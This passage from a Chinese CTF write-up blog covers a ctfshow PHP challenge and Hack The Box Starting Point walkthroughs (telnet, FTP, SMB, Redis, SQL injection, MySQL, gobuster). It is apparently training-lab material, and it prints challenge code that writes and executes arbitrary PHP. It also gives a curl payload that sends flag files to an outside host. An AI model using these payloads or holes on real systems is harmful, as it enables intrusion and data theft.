class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-05 02:03:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Swoole\Http\Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, function (<span class="variable">$server</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, function (<span class="variable">$request</span>, <span class="variable">$response</span>) &#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬è®¿é—®/ctf/file postä¼ å…¥çš„sä¼šå†™å…¥shell.phpä¸­ï¼Œç„¶åå½“æˆ‘ä»¬è®¿é—®/ctf/execæ—¶ï¼Œå°±ä¼šå»æ‰§è¡Œåˆšæ‰çš„shell.phpã€‚<br>é‡Œé¢çš„å†…å®¹å¤§å®¶å°±å¯ä»¥éšæ„å‘æŒ¥äº†ã€‚<br>æˆ‘å†™çš„æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://xxx.xxx.xxx:4567?p=`cat f*`&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„é¢˜å°±ä¸åšäº†</p><p>å»çœ‹yuå¸ˆå‚…å’ŒY4å¸ˆå‚…çš„åšå®¢å°±å¥½äº†</p><p><a href="https://blog.csdn.net/solitudi/article/details/113778651">Y4wp </a>    <a href="https://blog.csdn.net/miuzzx/article/details/112692697?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ctfshow%20web396&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-112692697.nonecase&amp;spm=1018.2226.3001.4187">yu2xxwp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow å…¶ä»– åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb-starting point</title>
      <link href="/posts/41d43cf2.html"/>
      <url>/posts/41d43cf2.html</url>
      
        <content type="html"><![CDATA[<h2 id="Meow-telnet"><a href="#Meow-telnet" class="headerlink" title="Meow(telnet)"></a>Meow(telnet)</h2><p><img src="../images/image-20230329161813096.png" alt="image-20230329161813096"></p><p><img src="../images/image-20230329152247821.png" alt="image-20230329152247821"></p><p>æ€ä¹ˆå…ˆå®Œæˆvpnçš„é…ç½®ï¼Œè®°å¾—ä¸Šé¢çš„<strong>vpnæ•°å­—</strong>è¦é€‰ä¸€æ ·çš„ï¼Œä¸ç„¶pingä¸é€šï¼Œ</p><p>è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯å…ˆå…³é—­é¶æœºåœ¨å…³é—­vpnï¼Œä¸ç„¶çš„è¯å¾—ç­‰å¥½å‡ ä¸ªå°æ—¶æ‰èƒ½é‡æ–°è¿æ¥vpn</p><p>å…ˆpingä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹é¶æœºæ˜¯å¦å­˜æ´»</p><p><img src="../images/image-20230329152446543.png" alt="image-20230329152446543"></p><p>æœ‰è¿”å›äº†ï¼Œä»£è¡¨å­˜æ´»</p><p>ç„¶åæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230329152518368.png" alt="image-20230329152518368"></p><p>å‘ç°23ç«¯å£æ˜¯æ‰“å¼€çš„ï¼Œå¹¶ä¸”æ˜¯telnetæœåŠ¡çš„</p><p>å› ä¸ºtelnetæ˜¯è¿œç¨‹ç™»å½•æœåŠ¡å™¨æœåŠ¡ï¼Œå°è¯•ç”¨è¿™ä¸ªæœåŠ¡åŒºç™»å½•ä¸€ä¸‹</p><p><strong>telnet xxxxxxxx</strong></p><p><img src="../images/image-20230329152843423.png" alt="image-20230329152843423"></p><p><img src="../images/image-20230329152903431.png" alt="image-20230329152903431"></p><p>æœ€åçŒœçš„rootç”¨æˆ·ï¼Œç„¶åç™»å½•æˆåŠŸ</p><p>æ‹¿åˆ°flag</p><h2 id="Fawn-ftp"><a href="#Fawn-ftp" class="headerlink" title="Fawn(ftp)"></a>Fawn(ftp)</h2><p><img src="../images/image-20230329161804441.png" alt="image-20230329161804441"></p><p><img src="../images/image-20230329153208092.png" alt="image-20230329153208092"></p><p>å¯ä»¥pingé€šï¼Œè¯´æ˜ä¸»æœºå­˜æ´»</p><p>ç„¶åè¿›è¡Œnmapæ‰«æ</p><p>-sV æ¢æµ‹æœåŠ¡/ç‰ˆæœ¬ä¿¡æ¯ æˆ‘ä»¬å¯ä»¥çœ‹åˆ° å¼€æ”¾21ç«¯å£çš„ftpåè®® ç‰ˆæœ¬æ˜¯ vsftpd 3.0.3</p><p><img src="../images/image-20230329153834657.png" alt="image-20230329153834657"></p><p>ç›®æ ‡ä¸Šè¿è¡Œçš„æ“ä½œç³»ç»Ÿç±»å‹æ˜¯Unix</p><p><strong>å¯¹ftpè¿›è¡Œè¡¥å……ä¸€ä¸‹</strong></p><p>FTPæ²¡æœ‰è´¦æˆ·æ—¶å€™æˆ‘ä»¬çš„username: anonymous é‡‡ç”¨åŒ¿åè®¿é—®;</p><p>å¯¹äºFTPæˆ‘ä»¬æ¯æ¬¡æ“ä½œæœåŠ¡å™¨éƒ½ä¼šç»™æˆ‘ä»¬å›åº”çŠ¶æ€ç  ä¸åŒçŠ¶æ€ç å¯¹åº”ä¸åŒçš„çš„å«ä¹‰ï¼š</p><p><img src="../images/image-20230329154248434.png" alt="image-20230329154248434"></p><p>æ¯”å¦‚ç”¨æˆ·ç™»å½•æˆåŠŸ æœåŠ¡å™¨å°±ä¼šè¿”å›230çŠ¶æ€ç ;</p><p>åœ¨è¿™ä¸ªftpæœåŠ¡å™¨ä¸Šæ˜¯ä¸èƒ½ç›´æ¥catè¯»å–æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬å¾—è¿›è¡Œgetå¤–å¸¦</p><p>ä¸‹è½½æ–‡ä»¶</p><p>ä¸‹è½½æ–‡ä»¶é€šå¸¸ç”¨getå’Œmgetè¿™ä¸¤æ¡å‘½ä»¤ã€‚ a) get æ ¼å¼ï¼šget [remote-file] [local-file] å°†æ–‡ä»¶ä»è¿œç«¯ä¸»æœºä¸­ä¼ é€è‡³æœ¬åœ°ä¸»æœºä¸­ã€‚ å¦‚è¦è·å–è¿œç¨‹æœ</p><p><code>ftp&gt; get /usr/your/1.htm 1.htm (å›è½¦)</code></p><p>b) mgetã€€ã€€ã€€ã€€ã€€ã€€ æ ¼å¼ï¼šmget [remote-files] ä»è¿œç«¯ä¸»æœºæ¥æ”¶ä¸€æ‰¹æ–‡ä»¶è‡³æœ¬åœ°ä¸»æœºã€‚ å¦‚è¦è·å–æœåŠ¡å™¨ä¸Š/usr/your/ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåˆ™</p><p><code>ftp&gt; cd /usr/your/ ftp&gt; mget *.* (å›è½¦)</code></p><p>å…ˆç”¨ftp è¿æ¥ æœåŠ¡å™¨ é‡‡ç”¨åŒ¿åç™»å½• æ— å¯†ç  æŸ¥è¯¢æœåŠ¡å™¨ æ–‡ä»¶ å‘ç°flag è¿›è¡Œä¸‹è½½ ç„¶åæœ¬åœ°è¯»å–</p><p><img src="../images/image-20230329154621851.png" alt="image-20230329154621851"></p><p>åŒ¿åè®¿é—®ï¼Œæ²¡æœ‰å¯†ç </p><p><img src="../images/image-20230329154739182.png" alt="image-20230329154739182"></p><p>ç„¶åå°±å¯ä»¥æœ¬åœ°å½“å‰ç›®å½•ä¸‹æŸ¥çœ‹flagäº†</p><p><img src="../images/image-20230329154822624.png" alt="image-20230329154822624"></p><p>é€šå…³</p><h2 id="Dancing-SMB"><a href="#Dancing-SMB" class="headerlink" title="Dancing(SMB)"></a>Dancing(SMB)</h2><p><img src="../images/image-20230329161824778.png" alt="image-20230329161824778"></p><p>è¿˜æ˜¯å…ˆpingä¸‹</p><p><img src="../images/image-20230329155320103.png" alt="image-20230329155320103"></p><p>å¯ä»¥pingé€šï¼Œè¯´æ˜ä¸»æœºå­˜æ´»</p><p>SMB(å…¨ç§°æ˜¯Server Message Block)æ˜¯ä¸€ä¸ªç½‘ç»œ<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEQlOEYlRTglQUUlQUUvMTMwMjAyNjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=">åè®®</a>åï¼Œå®ƒèƒ½è¢«ç”¨äº<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9XZWIvMTUwNTY0P2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">Web</a>è¿æ¥å’Œ<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUUlQTIlRTYlODglQjclRTclQUIlQUYvMTAxMDgxP2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">å®¢æˆ·ç«¯</a>ä¸æœåŠ¡å™¨ä¹‹é—´çš„<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQkYlQTElRTYlODElQUYlRTYlQjIlOUYlRTklODAlOUEvMTA1MzAxMj9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">ä¿¡æ¯æ²Ÿé€š</a>ã€‚SMBæœ€åˆæ˜¯IBMçš„è´ç‘Â·è´¹æ ¹é²å§†ï¼ˆBarry Feigenbaumï¼‰ç ”åˆ¶çš„ï¼Œå…¶ç›®çš„æ˜¯å°†<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9ET1MlRTYlOTMlOEQlRTQlQkQlOUMlRTclQjMlQkIlRTclQkIlOUYvNjE4NjAwMz9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">DOSæ“ä½œç³»ç»Ÿ</a>ä¸­çš„æœ¬åœ°æ–‡ä»¶æ¥å£â€œä¸­æ–­13â€æ”¹é€ ä¸º<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclQkQlOTElRTclQkIlOUMlRTYlOTYlODclRTQlQkIlQjYlRTclQjMlQkIlRTclQkIlOUYvOTcxOTQyMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ</a>ã€‚<br>ç®€è€Œè¨€ä¹‹å°±æ˜¯ä¸ªä¼ è¾“æ–‡ä»¶ æ–‡ä»¶å…±äº«ç”¨çš„åè®® è·ŸFTPå·®ä¸äº†å¤ªå¤šã€‚</p><p><img src="../images/image-20230329160924545.png" alt="image-20230329160924545"></p><p>ä½¿ç”¨nmapæ‰«ä¸€ä¸‹ï¼Œå‘ç°å¼€äº†ä¸‰ä¸ªç«¯å£</p><p>135: <strong>msrpc</strong> <strong>ï¼ˆMicroSoft Remote Procedure Callï¼Œå¾®è½¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰</strong> è¿™æ˜¯windowsç³»ç»Ÿç‰¹æœ‰çš„æœåŠ¡<br>139:<strong>netbios-ssn</strong> ç”¨äºæä¾›æ–‡ä»¶å…±äº«æœåŠ¡,ä¸»è¦ç”¨äºä¼ä¸šå†…éƒ¨ç½‘ä¹‹é—´äº’ç›¸è®¿é—® ä¹Ÿæ˜¯å¾®è½¯çš„æœåŠ¡<br>445:å°±æ˜¯æˆ‘ä»¬è¯´çš„<strong>SMB</strong><br>å°è¯•è¿æ¥SMB å¯†ç ä¸ºç©º è¿æ¥æˆåŠŸï¼š</p><p><img src="../images/image-20230329161145722.png" alt="image-20230329161145722"></p><p>å¯ä»¥çœ‹åˆ°æœ‰WorkShares çš„ç›®å½• å¯ä»¥è®¿é—® ï¼Œè¿›è¡Œè®¿é—®<br>smbclient //10.129.71.90/WorkShares<br>æ‰¾äº†ä¸€ä¸‹flag.txt å‘ç° æ²¡æœ‰ äºæ˜¯è¿›å…¥åˆ«çš„ç›®å½•æ‰¾ åœ¨James.Pä¸‹æ‰¾åˆ°</p><p><img src="../images/image-20230329161314793.png" alt="image-20230329161314793"></p><p><img src="../images/image-20230329161347826.png" alt="image-20230329161347826"></p><p>é€šå…³</p><h2 id="Redeemer-Redis"><a href="#Redeemer-Redis" class="headerlink" title="Redeemer(Redis)"></a>Redeemer(Redis)</h2><p><img src="../images/image-20230329161840375.png" alt="image-20230329161840375"></p><p><strong>Redis</strong>æ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚redisçš„é»˜è®¤ç«¯å£å·æ˜¯6379ã€‚</p><p><strong>è¿˜æ˜¯å…ˆpingä¸€ä¸‹</strong></p><p><img src="../images/image-20230329162205909.png" alt="image-20230329162205909"></p><p>æ¥ä¸‹æ¥æ‰«ä¸€ä¸‹é»˜è®¤ç«¯å£</p><p>å‰é¢æ²¡æ‰«åˆ°æ˜¯å› ä¸ºnmapé»˜è®¤çš„ç«¯å£å¥½æ˜¯1-1000</p><p><img src="../images/image-20230329162326905.png" alt="image-20230329162326905"></p><p><img src="../images/image-20230329162446458.png" alt="image-20230329162446458"></p><p>æ‰«åˆ°redisç‰ˆæœ¬äº†</p><p><strong>é€šè¿‡redis-cliå°è¯•è¿æ¥</strong></p><p><img src="../images/image-20230329162733702.png" alt="image-20230329162733702"></p><p>è¿æ¥æˆåŠŸï¼Œé€šè¿‡è¾“å…¥ <strong>info</strong> æŸ¥çœ‹redisæœåŠ¡ä¿¡æ¯ä¸çŠ¶æ€ï¼Œå‘ç°æ•°æ®åº“åä¸Keyä¸ªæ•°ï¼Œé€šè¿‡æŸ¥çœ‹æ•°æ®åº“å†…å®¹å‘ç°<strong>flag</strong></p><p><img src="../images/image-20230329162841616.png" alt="image-20230329162841616"></p><p><img src="../images/image-20230329162921188.png" alt="image-20230329162921188"></p><p>é€šå…³</p><p>(vipçš„é¢˜åšä¸äº†)  â€”â€”&gt;  åªèƒ½å»åš ä¸‹ä¸€ä¸ªæ¿å—å…è´¹çš„é¢˜äº†</p><h2 id="Appointment-sqlæ³¨å…¥"><a href="#Appointment-sqlæ³¨å…¥" class="headerlink" title="Appointment(sqlæ³¨å…¥)"></a>Appointment(sqlæ³¨å…¥)</h2><p><img src="../images/image-20230329164816236.png" alt="image-20230329164816236"></p><p>å…ˆpingä¸€ä¸‹</p><p><img src="../images/image-20230329164831717.png" alt="image-20230329164831717"></p><p>pingé€šäº†</p><p>è¿™é¢˜å¾—å¼€kaliçš„å›¾å½¢åŒ–ç•Œé¢äº†ï¼Œå› ä¸ºè¿™é‡Œè€ƒå¯Ÿçš„ç‚¹æ˜¯sqlæ³¨å…¥</p><p>è¿™é‡Œè¿æ¥openvpnçš„æ—¶å€™ï¼Œmachineè¦è¿æ¥udp,start-pointè¦è¿æ¥tcp</p><p>ä¸ç„¶çš„è¯é¶æœºç”¨ä¸äº†</p><p>æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230330143929462.png" alt="image-20230330143929462"></p><p>å‘ç°80é»˜è®¤ç«¯å£æ‰“å¼€ï¼Œ<img src="../images/image-20230330144058574.png" alt="image-20230330144058574"></p><p>ç„¶åå°è¯•ä¸€ä¸‹å¼±å¯†ç ï¼Œå‘ç°ä¸è¡Œååœ¨å°è¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç æ³¨å…¥è¯•è¯•</p><p><img src="../images/image-20230330144149273.png" alt="image-20230330144149273"></p><p>ä¸‡èƒ½å¯†ç æ³¨å…¥æˆåŠŸ</p><p>é€šå…³</p><h2 id="Sequel-mysql"><a href="#Sequel-mysql" class="headerlink" title="Sequel(mysql)"></a>Sequel(mysql)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230330145212076.png" alt="image-20230330145212076"></p><p>è¿˜æ˜¯å…ˆpingä¸€ä¸‹</p><p><img src="../images/image-20230330145240338.png" alt="image-20230330145240338"></p><p>èƒ½é€šï¼Œæ‰«ä¸€ä¸‹ç«¯å£å·</p><p><img src="../images/image-20230330145921057.png" alt="image-20230330145921057"></p><p>æ‰«å®Œäº†ï¼Œå‘ç°å¼€äº†ä¸ª3306ç«¯å£ï¼Œæ˜¯mysqlçš„é»˜è®¤ç«¯å£å·</p><p>ç„¶åæˆ‘ä»¬å°è¯•è¿æ¥ä¸€ä¸‹æ•°æ®åº“(æ²¡å®‰è£…mysqlçš„è‡ªå·±æ‰‹åŠ¨å®‰è£…ä¸€ä¸‹)</p><p><img src="../images/image-20230330150224251.png" alt="image-20230330150224251"></p><p>è¿™é‡Œçš„å¯†ç ä¸ºç©ºå°±ä¸å¡«äº†(rootç”¨æˆ·(å°±æ˜¯ç”¨æˆ·å)å…è®¸æ— å¯†ç ç™»å½•)</p><p><img src="../images/image-20230330150343364.png" alt="image-20230330150343364"></p><p>è¿æ¥æˆåŠŸ</p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨sqlè¯­å¥æ¥æŸ¥è¯¢äº†</p><p><img src="../images/image-20230330150501495.png" alt="image-20230330150501495"></p><p>æœ€åæ‹¿åˆ°flag</p><p>é€šå…³</p><h2 id="Crocodile-ftpå’Œwebç½‘é¡µ"><a href="#Crocodile-ftpå’Œwebç½‘é¡µ" class="headerlink" title="Crocodile(ftpå’Œwebç½‘é¡µ)"></a>Crocodile(ftpå’Œwebç½‘é¡µ)</h2><p><img src="../images/image-20230330150804673.png" alt="image-20230330150804673"></p><p>è¿˜æ˜¯å…ˆpingä¸€ä¸‹</p><p><img src="../images/image-20230330150834777.png" alt="image-20230330150834777"></p><p>æ¥ä¸‹æ¥æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230330151245444.png" alt="image-20230330151245444"></p><p>æ‰«å‡ºæ¥è€æœ‹å‹ftpäº†ï¼Œè¿˜æœ‰è¿™ä¸ª80ç«¯å£çš„webç½‘é¡µï¼Œé‚£æˆ‘ä»¬è¿˜æ˜¯å…ˆå»çœ‹ä¸€ä¸‹è¿™ä¸ªftp</p><p><img src="../images/image-20230330151515067.png" alt="image-20230330151515067"></p><p><img src="../images/image-20230330151620224.png" alt="image-20230330151620224"></p><p>ç›´æ¥æŠŠftpæœåŠ¡å™¨ä¸Šçš„è´¦å·å¯†ç å…¨ç»™æå–åˆ°æœ¬åœ°äº†</p><p><img src="../images/image-20230330152635235.png" alt="image-20230330152635235"></p><p>è®¿é—®ç½‘ç«™çœ‹åˆ°è¿™ç©æ„(æ‰“å¼€çœŸæ…¢)</p><p>ç„¶ååˆ©ç”¨<code>gobuster</code>æ‰«ä¸€ä¸‹ç½‘ç«™</p><p>gobuster dir -u <a href="http://10.129.98.232">http://10.129.98.232</a> -w /usr/share/wordlists/dirb/common.txt</p><p>dir  â€”-&gt; æ˜¯æ‰«ç›®å½•</p><p>dns  â€”-&gt;çˆ†ç ´dns</p><p>vHost  â€”-&gt; æ‰«å­åŸŸ</p><p><img src="../images/image-20230330152958204.png" alt="image-20230330152958204"></p><p>å‘ç°å­˜åœ¨301é‡å®šå‘(302ä¹Ÿæ˜¯)ï¼Œç„¶åå»è®¿é—®ä¸€ä¸‹</p><p>åœ¨è®¿é—®åˆ°<a href="http://10.129.98.232/dashboard/çš„æ—¶å€™ï¼Œè·³è½¬åˆ°äº†">http://10.129.98.232/dashboard/çš„æ—¶å€™ï¼Œè·³è½¬åˆ°äº†</a></p><p><img src="../images/image-20230330153223984.png" alt="image-20230330153223984"></p><p>ç„¶åæˆ‘ä»¬å°±æ‹¿ä¹‹å‰åœ¨ftpæœåŠ¡å™¨è·å–çš„è´¦å·å¯†ç è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230330153317372.png" alt="image-20230330153317372"></p><p>é€šå…³</p><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder()"></a>Responder()</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230330154052951.png" alt="image-20230330154052951"></p><p>è€ƒç‚¹æŒºå¤šçš„å•Š</p><p>è€æ ·å­è¿˜æ˜¯èƒ½pingé€š</p><p><img src="../images/image-20230403154945808.png" alt="image-20230403154945808"></p><p>ä½†æ˜¯å°±æ˜¯ç«¯å£æ‰«æå¤ªæ…¢äº†</p><p>è¿™é‡Œå°±æ‹¿ä¸€ä¸‹åˆ«äººæ‰«å‡ºçš„ç«¯å£å·</p><p>nmapçš„ä¸€äº›æŒ‡ä»¤çš„ç”¨æ³•</p><p>å€Ÿç”¨ä¸€ä¸‹ï¼Œ-sS ä½¿ç”¨ SYN æ‰«æï¼Œå› ä¸º TCP æ‰«æä¼šç»å†ä¸‰æ¬¡æ¡æ‰‹è€—è´¹å¤§é‡æ—¶é—´ï¼Œ-Pn æ˜¯ç¦ ping ä¸»æœºï¼Œé˜²æ­¢è¢«é˜²ç«å¢™è¿‡æ»¤è€Œæ¼æ‰«ï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰ä¸€ä¸ªä¸»æœºï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“ï¼Œ-n ä¸è§£æåŸŸåï¼Œ-open åªè¾“å‡ºå¼€æ”¾ç«¯å£ï¼Œç»“æœæ‰«æåˆ° 3 ä¸ªç«¯å£ï¼Œè€Œä¸”æ³¨æ„ 5985 ç«¯å£æ‰«æå‡ºçš„æœåŠ¡ä¹Ÿæœ‰æ‰€ä¸åŒ</p><p><img src="../images/image-20230403160224371.png" alt="image-20230403160224371"></p><p><strong>è¿™ä¸ª wsman å…¨ç§°æ˜¯ Windows Remote Managemen(WS_Management) ,å¦‚æœä½¿ç”¨ Win7 æˆ–è€…Windows 2003 Serverä»¥ä¸Šç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿï¼Œå¾®è½¯åœ¨ç³»ç»Ÿä¸­å·²ç»è‡ªå¸¦äº†æ”¯æŒWSMAN çš„ç®¡ç†å®¢æˆ·ç«¯ï¼Œå«åš winrmï¼Œå®ƒå¯ä»¥æä¾›è¿œç¨‹ powershell ç®¡ç†æœåŠ¡ï¼Œå¬èµ·æ¥å°±æ¯”è¾ƒå±é™©</strong></p><p>æ‰«åˆ°äº†è¿™å‡ ä¸ªç«¯å£å·ï¼Œä½†æ˜¯å»è®¿é—®<strong>80</strong>çš„æ—¶å€™å´æŠ¥é”™ï¼Œç„¶åé‡å®šå‘åˆ°äº†å¦ä¸€ä¸ªåŸŸåå¤„</p><p><img src="../images/image-20230403160317545.png" alt="image-20230403160317545"></p><p>5985ç«¯å£ä¹Ÿæ˜¯ä¸€æ ·(ä½†æ˜¯æ²¡æœ‰é‡å®šå‘)</p><p><img src="../images/image-20230403160622798.png" alt="image-20230403160622798"></p><p>7680ç«¯å£ä¹Ÿæ˜¯è¿™æ ·ï¼Œæ²¡æœ‰é‡å®šå‘</p><p><img src="../images/image-20230403160558935.png" 